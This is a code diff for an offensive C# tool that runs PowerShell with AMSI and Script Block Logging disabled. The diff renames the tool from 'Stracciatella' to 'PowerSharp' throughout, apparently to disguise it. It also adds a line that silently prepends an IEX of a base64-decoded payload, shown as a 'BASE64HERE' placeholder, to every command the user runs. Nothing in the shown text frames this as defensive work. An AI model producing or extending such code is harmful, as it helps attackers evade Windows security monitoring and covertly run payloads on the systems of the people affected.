@@ -1,4 +1,4 @@
-﻿using System.Management.Automation;
+using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.IO;
 using System.Linq;
@@ -9,11 +9,11 @@ using System.Globalization;
 using System.Reflection;
 using System.Collections.Generic;
 
-namespace Stracciatella
+namespace PowerSharp
 {
-    class Stracciatella
+    class PowerSharp
     {
-        private static string GLOBAL_PROMPT_PREFIX = "Stracciatella";
+        private static string GLOBAL_PROMPT_PREFIX = "PowerSharp";
 
         internal class Options
         {
@@ -50,7 +50,7 @@ namespace Stracciatella
         private static void PrintBanner()
         {
             Console.WriteLine("");
-            Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.");
+            Console.WriteLine("  :: PowerSharp - Powershell runspace with AMSI and Script Block Logging disabled.");
             Console.WriteLine("  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>");
             Console.WriteLine("");
         }
@@ -58,7 +58,7 @@ namespace Stracciatella
         private static void Usage()
         {
             PrintBanner();
-            Console.WriteLine("Usage: stracciatella.exe [options] [script]");
+            Console.WriteLine("Usage: PowerSharp.exe [options] [script]");
             Console.WriteLine("  script                - Path to file containing Powershell script to execute. If not options given, will enter a pseudo-shell loop.");
             Console.WriteLine("  -v, --verbose         - Prints verbose informations");
             Console.WriteLine("  -f, --force           - Proceed with execution even if Powershell defenses were not disabled. By default we bail out on failure.");
@@ -511,6 +511,7 @@ namespace Stracciatella
 
         private static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host, bool silent = false)
         {
+
             string output = "";
             if (command != null && command.Length > 0)
             {
@@ -533,6 +534,8 @@ namespace Stracciatella
                         if(!silent)
                             Info($"[-] Could not decode command: {e.Message.ToString()}");
                     }
+
+                    command =  "IEX([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('BASE64HERE'))); " + command;
 
                     pipe.Commands.AddScript(command);
                     pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
